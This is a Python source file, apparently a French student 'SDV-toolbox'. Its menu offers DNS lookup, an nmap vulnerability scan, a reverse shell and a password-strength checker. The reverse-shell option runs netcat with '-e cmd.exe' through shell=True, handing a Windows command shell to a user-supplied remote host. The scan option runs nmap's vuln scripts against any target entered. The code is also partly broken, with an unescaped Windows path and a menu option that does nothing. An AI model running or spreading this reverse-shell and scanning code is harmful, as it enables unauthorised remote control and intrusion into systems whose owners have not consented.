# Bienvenue sur la Generoso SDV-toolbox v2024

import socket
import subprocess
import dns.resolver
import time

# Menu principal
def afficher_menu():
    print("╔══════════════════════════════════════╗")
    print("║       The Generoso SDV-toolbox       ║")
    print("║                                      ║")
    print("║            Menu principal            ║")
    print("╠══════════════════════════════════════╣")
    print("║ Fonctions :                          ║")
    print("║  1. Vérification de domaine          ║")
    print("║  2. Scan de vulnérabilités           ║")
    print("║  3. Shell inversé                    ║")
    print("║  4. Rapport                          ║")
    print("║                                      ║")
    print("║ Extra :                              ║")
    print("║  5. Analyseur de mots de passe       ║")
    print("╠══════════════════════════════════════╣")
    print("║  0. Quitter                          ║")
    print("╚══════════════════════════════════════╝")

# Fonction pour exécuter le menu
def executer_menu():
    while True:
        afficher_menu()
        choix = input("Choisissez une option : ")
        if choix == "1":
            nslookup()
        elif choix == "2":
            vuln_scan()
        elif choix == "3":
            reverse_shell()
        elif choix == "5":
            password_analyzer()
        elif choix == "0":
            print("════════════════════════════════════════")
            print("Arrêt en cours..... ")
            time.sleep(3) 
            break
        else:
            print("Erreur ! Veuillez entrer un nombre entre 0 et .... :")

# Option 1 : Information sur le domaine
def nslookup():
    print("╔════════════════════════════════════╗")
    print("║ Option 1 : Vérification de domaine ║")
    print("╚════════════════════════════════════╝")
    target = input("Entrez un nom de domaine : ")
    resolver = dns.resolver.Resolver()
    resolver.timeout = 10
    resolver.lifetime = 10
    resolver.nameservers = ['8.8.8.8']

    try:
        # Récupérer l'adresse IP associée au nom de domaine
        ip_address = socket.gethostbyname(target)
        print(f"L'adresse IP de {target} est {ip_address}")

        # Récupérer les serveurs de noms (NS)
        ns_records = resolver.resolve(target, 'NS')
        print("- Serveurs de noms :")
        for ns in ns_records:
            print(ns.target)

        # Récupérer les enregistrements MX (pour le courrier électronique)
        mx_records = resolver.resolve(target, 'MX')
        print("(- Enregistrements MX :")
        for mx in mx_records:
            print(f'{mx.exchange} a une priorité de {mx.preference}')

        # Récupérer les enregistrements TXT
        txt_records = resolver.resolve(target, 'TXT')
        print("- Enregistrements TXT :")
        for txt in txt_records:
            print(txt.strings)

    # Gestion des erreurs
    except socket.gaierror as e:
        print(f"Erreur lors de la recherche du nom de domaine {target}: {e}")
    except dns.resolver.NoAnswer as e:
        print(f"Pas de réponse pour {target}: {e}")
    except Exception as e:
        print(f"Une erreur est survenue: {e}")

# Option 2 : Scan de ports et services + script nmap
def vuln_scan():
    print("╔═══════════════════════════════════╗")
    print("║ Option 2 : Scan de vulnérabilités ║")
    print("╚═══════════════════════════════════╝")
    print("Entrez l'adresse IP ou le domaine à scanner : ")
    cible = input("-> ")
   
    # Input degré d'attaque
    attaque = input("Entrez le degré d'attaque de 0 à 5 (par défaut 3) : ")
    if not attaque:
        attaque = "3"
   
    # Input choix des ports à scanner
    debut_port = input("Entrez le numéro du premier port à scanner (par défaut 1) : ")
    if not debut_port:
        debut_port = "1"
    fin_port = input("Entrez le numéro du dernier port à scanner (par défaut 1000) : ")
    if not fin_port:
        fin_port = "1000"
   
    # Commande Nmap
    commande_nmap = ["nmap", "-Pn", f"-T{attaque}", f"-p{debut_port}-{fin_port}", "-sV", "--script=vuln", cible]
   
    try:
        resultat = subprocess.run(commande_nmap, capture_output=True, text=True, check=True)
        
        print(resultat.stdout)
    except subprocess.CalledProcessError as e:
       
        # Affichage du message d'erreur en cas d'échec de la commande
        print("Erreur lors de l'exécution de la commande Nmap :", e)

# Option 3 : Créer un shell inversé avec netcat
def reverse_shell():
    print("╔══════════════════════════╗")
    print("║ Option 3 : Shell inversé ║")
    print("╚══════════════════════════╝")
    print("Entrez l'adresse IP de l'hôte à écouter : ")
    ip_hôte = input("-> ")
   
    # Input du port d'écoute
    port = input("Entrez le numéro du port à écouter (par défaut 4444) : ")
    if not port:
        port = "4444"
   
    # Chemin complet de l'exécutable netcat (A PERSONNALISER)
    chemin_netcat = "C:\netcat-win32-1.12\nc.exe"  
   
    # Commande netcat
    commande_netcat = f"{chemin_netcat} -e cmd.exe {ip_hôte} {port}"
   
    try:
        resultat = subprocess.run(commande_netcat, shell=True)
        commentaire = """--->> Si le returncode est de 0, la connexion a été établie <<---"""
        print(resultat)
        print(commentaire)
    except subprocess.CalledProcessError as e:
       
        # Affichage du message d'erreur en cas d'échec de la commande
        print("Erreur lors de l'exécution de la commande netcat :", e)

# Extra : Analyseur de mots de passe
def password_analyzer():
    print("╔════════════════════════════════════╗")
    print("║ Extra : Analyseur de mots de passe ║")
    print("╚════════════════════════════════════╝")
    password = input("Entrez un mot de passe : ")
    result = analyse_password_processus(password)
    print(result)

# Proccesus pour l'execution de l'analyse de mots de passe
def analyse_password_processus(password):

    # Mots de passe communs (A PERSONNALISER)
    password_commun = ["password", "123456", "qwerty", "azertyuiop", "root"]
    if password.lower() in password_commun:
        return "Le mot de passe couramment utilisé"
        
    # Longueur
    if len(password) < 8:
        return "Le mot de passe trop court, veuillez utiliser au moins 8 caractères"
    
    # Majuscules et minuscules
    if password.lower() == password or password.upper() == password:
        return "Le mot de passe doit contenir des lettres majuscules et minuscules"
    
    # Caractères spéciaux
    special_car = "!@#$%^&*()_+[]{}|;:,.<>?~"
    if not any(char in special_car for char in password):
        return "Le mot de passe doit contenir au moins un caractère spécial"
        
    # Si le mot de passe n'est pas dans les catégories 
    return "Mot de passe fort !"

# Exécution du menu
if __name__ == "__main__":
    executer_menu()
